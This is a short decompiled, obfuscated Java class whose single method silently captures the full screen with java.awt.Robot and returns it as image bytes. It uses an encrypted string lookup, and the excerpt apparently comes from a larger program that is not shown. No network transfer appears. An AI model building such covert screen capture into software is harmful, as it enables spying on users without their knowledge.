/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.RenderedImage;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import javax.imageio.ImageIO;

public final class g {
    public static byte[] a() {
        try {
            Object object = new Robot();
            Object object2 = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            object = ((Robot)object).createScreenCapture((Rectangle)object2);
            object2 = new ByteArrayOutputStream();
            ImageIO.write((RenderedImage)object, $S.d(883), (OutputStream)object2);
            return ((ByteArrayOutputStream)object2).toByteArray();
        }
        catch (Exception exception) {
            return null;
        }
    }
}

